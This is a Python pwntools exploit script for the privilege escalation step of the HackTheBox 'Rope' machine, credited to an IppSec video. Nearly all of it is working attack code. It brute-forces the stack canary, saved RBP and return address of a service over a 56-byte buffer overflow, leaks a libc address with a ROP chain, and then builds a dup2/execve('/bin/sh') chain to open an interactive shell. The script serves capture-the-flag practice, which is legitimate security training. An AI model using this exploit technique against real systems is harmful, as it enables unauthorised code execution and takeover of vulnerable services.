#
#  Privilege Escalation Exploit for HackTheBox Rope
#
#  From IppSec https://youtu.be/GTQxZlr5yvE
# 

from pwn import *
from concurrent import futures
from base64 import b64encode, b64decode
from time import sleep

context(os='linux',arch='amd64')
RHOST       = '127.0.0.1'
RPORT       = '1337'
MAX_WORKERS = 50

class BruteForcer():
    def __init__(self):
        end_pool = False
        previous = ""
        result = ""

    def check_byte(self, payload):

        if not self.end_pool:
            r = remote(RHOST, RPORT, level='error')
            # may have to increase timeout on the remote server
            r.recvline(timeout=1)
            r.send(payload)
            
            try:
                resp = r.recvline(timeout=1).rstrip()
                if "Done." == resp.decode():
                    r.close
                    return True
            except:
                pass

            try:
                r.close()
            except:
                pass

        return False

    def done(self,fn):
        # Byte was found, Append to result (content) and tell all jobs the work is done
        if fn.result():
            # print(f"Byte Found: {fn.arg}")
            self.content += chr(fn.arg)
            self.end_pool = True
    
    def get_address(self, previous):
        self.result = ""
        self.content = ""
        
        # run until we have the full address

        while len(self.content) != 8:
            junk = "A" * 56 + previous

            self.end_pool = False
            # this needs to be set to 2 when connecting to remote
            ex = futures.ThreadPoolExecutor(max_workers=MAX_WORKERS)
            for byte in range(0x00,0x100):
                payload = junk + self.content + chr(byte)
                f = ex.submit(self.check_byte, payload)
                f.arg = byte
                f.add_done_callback(self.done)

            while True:
                if self.end_pool == True:
                    break

                if ex._work_queue.empty() and len(ex._threads) == 0:
                    log.error("Failed to get byte, looped through everything")

                    break
                sleep(1)

        return self.content


# Stage 0 Previous values
# Because the brute part takes time - save the values for subsequent runs

# canary = p64(0xfff36c61f3dbd500).decode('latin-1')
# RBP    = p64(0x7fffffffdf60).decode('latin-1')
# RIP    = p64(0x555555555562).decode('latin-1')
  
# Stage 1 Brute force values    

bf = BruteForcer()
canary = bf.get_address("")
log.success(f"Canary: {hex(u64(canary))}")

bf = BruteForcer()
RBP = bf.get_address(canary)
log.success(f"RBP: {hex(u64(RBP))}")

bf = BruteForcer()
RIP = bf.get_address(canary + RBP)
log.success(f"RIP: {hex(u64(RIP))}")


junk = "A" * 56

prefix = f"{junk}{canary}{RBP}"

# Stage 2. Rebase our binaries

base_address = u64(RIP) - 0x1562
elf = ELF("./contact", checksec=False)

elf.address = base_address
rop = ROP(elf)

# Stage 3. leak libc address
# write(4, elf.got['write'],0x8)

rop.write(0x4, elf.got['write'], 0x8)
r = remote(RHOST, RPORT, level='error')
r.recvline(timeout=1)
log.info(f"Rop Chain write(): {rop.dump()}")

chain = rop.chain()
chain = chain.decode('latin-1')
r.send(prefix + chain)

write_libc = u64(r.recv(8))
log.success(f"Leaked write@libc: {hex(write_libc)}")

# Stage 4. Load Libc
log.info("Loading libc")
elf_libc = ELF('libc.so.6.64.kali', checksec=False)
elf_libc.address = write_libc - elf_libc.symbols['write']
rop_libc = ROP(elf_libc)
binsh = next(elf_libc.search('/bin/sh\x00'.encode()))


# Stage 5. Getting Code Execution

log.info("Stage 5 - RCE Time")

# dup2(4,0)
# dup2(4,1)
# execve(binsh, NULL, NULL)

rop_libc.dup2(0x4,0x0)
rop_libc.dup2(0x4,0x1)
rop_libc.execve(binsh,0x0, 0x0)
log.success(f"ROP Chain: {rop_libc.dump()}")

r = remote(RHOST, RPORT, level='error')
r.recvline(timeout=1)
chain = rop_libc.chain()
chain = chain.decode('latin-1')
r.send(prefix + chain)
r.interactive()

